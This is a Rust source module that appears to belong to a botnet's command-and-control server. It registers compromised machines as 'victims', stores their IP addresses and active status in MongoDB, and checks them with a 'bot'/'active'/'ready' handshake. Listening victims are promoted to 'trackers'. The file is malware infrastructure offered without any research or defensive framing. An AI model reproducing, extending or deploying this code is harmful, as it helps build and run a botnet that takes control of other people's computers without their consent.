use std::{fmt::Display, net::SocketAddr};

use serde::{Serialize, Deserialize};
use tokio::{io::{BufReader, AsyncBufReadExt, AsyncWriteExt}, net::TcpStream};
use mongodb::Collection;
use mongodb::bson::doc;

use crate::tracker::is_victim_listening;

#[derive(Debug, Clone, Copy, Deserialize, Serialize)]
pub enum VictimType {
    Bot,
    Tracker
}

impl Display for VictimType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let display = match self {
            Self::Bot => "Bot",
            Self::Tracker => "Tracker"
        };
        write!(f, "{}", display)
    }
}

#[derive(Debug, Deserialize, Serialize)]
pub struct Victim {
    pub ip: SocketAddr,
    pub victim_type: VictimType
}

impl Victim {
    pub async fn update_status(&self, victims_collection: &Collection<VictimDb>, status: bool) -> Result<(), Box<dyn std::error::Error>> {
        let filter = doc! { "ip": self.ip.to_string() };
        let update = doc! { "active": status };
        victims_collection.update_one(filter, update, None).await?;

        Ok(())
    }
}

#[derive(Debug, Deserialize, Serialize)]
pub struct VictimDb {
    pub ip: String,
    pub victim_type: VictimType,
    pub active: bool
}

pub async fn check_connection(mut stream: &mut TcpStream, current_ip: &SocketAddr) -> Option<Victim> {
    let mut buf_reader = BufReader::new(&mut stream);
    let mut http_request: Vec<u8> = Vec::new();
    buf_reader
        .read_until(0, &mut http_request).await.unwrap();

    let http_request = std::str::from_utf8(&http_request).unwrap();
    debug!("Request bytes: {:?}", http_request.as_bytes());
    if http_request != "bot\0" {
        error!("Someone connected without sending 'bot'");
        return None;
    };
    if stream.write_all("active\0".as_bytes()).await.is_err() {
        return None;
    }
    debug!("ip: {}", current_ip);
    let mut victim = Victim { ip: *current_ip, victim_type: VictimType::Bot };

    let mut buf_reader = BufReader::new(stream);

    let mut buffer = Vec::new();
    buf_reader.read_until(0, &mut buffer).await.unwrap();
    let buffer = std::str::from_utf8(&buffer).unwrap();
    if buffer != "ready\0" {
        error!("The client's server responded '{}' instead of 'ready'", buffer);
        return None;
    }
    if is_victim_listening(&victim).await {
        info!("The victim: {} is listening and will become a tracker", victim.ip);
        victim.victim_type = VictimType::Tracker;
    }

    Some(victim)
}
